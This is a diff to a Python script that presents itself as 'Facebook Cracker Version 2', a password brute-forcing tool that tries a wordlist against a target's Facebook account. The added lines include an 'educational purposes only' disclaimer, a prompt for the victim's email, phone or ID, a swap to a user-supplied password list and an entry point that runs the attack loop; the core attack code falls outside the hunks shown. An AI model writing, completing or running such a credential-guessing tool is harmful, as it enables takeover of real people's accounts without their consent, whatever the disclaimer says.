@@ -1,4 +1,10 @@
 #!/usr/bin/python3
+# Facebook Cracker Version 2 can crack into Facebook Database 100% without Interruption By Facebook Firewall!
+# This program is for educational purposes only.
+# Don't attack people's Facebook accounts; it's illegal!
+# If you want to crack into someone's account, you must have the permission of the user.
+# Mauritania Attacker is not responsible or even me!!
+
 import sys
 import random
 import mechanize
@@ -27,11 +33,7 @@ print("# Hit CTRL+C to quit the program")
 print("# Use www.graph.facebook.com for more infos about your victim ^_^")
 
 email = input("[+] Enter Email, Phone Number or ID: ")
-
-# Try to get the absolute path of the script's directory
-script_dir = os.path.dirname(os.path.abspath(__file__))
-passwordlist = os.path.join(script_dir, "darkweb2017-top10000.txt")
-
+passwordlist = input("[+] Enter the name of the password list file: ")
 useragents = [
     ('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')
 ]
@@ -118,4 +120,9 @@ def check():
         search()
         attack(password)
     except KeyboardInterrupt:
-       
+        print("\n [*] Exiting program ..\n")
+        sys.exit(1)
+
+
+if __name__ == '__main__':
+    check()
